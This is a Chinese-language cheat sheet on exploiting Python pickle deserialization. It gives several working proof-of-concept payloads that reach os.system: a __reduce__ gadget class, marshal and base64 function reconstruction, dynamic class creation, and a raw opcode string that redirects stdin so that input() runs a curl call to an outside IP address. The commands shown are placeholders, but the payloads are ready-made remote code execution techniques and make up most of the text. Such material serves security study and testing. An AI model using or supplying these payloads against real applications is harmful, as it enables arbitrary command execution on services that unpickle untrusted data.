参考：
	- https://xz.aliyun.com/t/219
	- http://www.bendawang.site/2018/04/18/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E8%8A%B1%E5%BC%8F%E5%88%A9%E7%94%A8/

可能存在的场景
1. 通常在解析认证token，session的时候。
2. 可能将对象Pickle后存储成磁盘文件。
3. 可能将对象Pickle后在网络中传输。

## poc
```python
#!/usr/bin/env python
#coding: utf-8
__author__ = 'bit4'

import pickle

class genpoc(object):
	def __reduce__(self):
		import os
		s = """echo test >poc.txt"""
		return os.system, (s,) 

e = genpoc()
flag=1
if flag:
	poc = pickle.dumps(e)
	print(poc)
else:
	with open('pickle.pkl', 'wb') as f:
	    pickle.dump(e, f)
```

还有以下3种可用

1. 利用marshal序列化函数

在勾陈的文章说到：
*从python2.6起，包含了一个可以序列化code对象的模块--Marshal。由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()*所以有了下面的这个任意函数构造payload。
```python
import base64
import marshal
# python2
def foo():
    import os
    os.system('dir')

payload="""ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'%s'
tRtRc__builtin__
globals
(tRS''
tR(tR."""%base64.b64encode(marshal.dumps(foo.func_code))

pickle.loads(payload)

payload="""ctypes
FunctionType
(cmarshal
loads
(S'%s'
tRc__builtin__
globals
(tRS''
tR(tR."""%marshal.dumps(foo.func_code).encode('string-escape')

pickle.loads(payload)
```

2. 构造新类
```python
payload=pickle.dumps(new.classobj('system', (), {'__getinitargs__':lambda self,arg=('dir',):arg, '__module__': 'os'})())

pickle.loads(payload)
'''
lambda语句可以换成new.function或是types.FunctionType构造。
么new库里面的提到的很多东西都可以转换思路了
'''
```
types可以换成new，因为types.FunctionType和new.function几乎一样


3. 使用input
python2中可以使用input执行命令
```
import pickle

a=b'''c__builtin__\nsetattr\n(c__builtin__\n__import__\n(S'sys'\ntRS'stdin'\ncStringIO\nStringIO\n(S'__import__('os').system('curl 172.27.60.184:12345')'\ntRtRc__builtin__\ninput\n(S'python> '\ntR.'''

pickle.loads(a)
```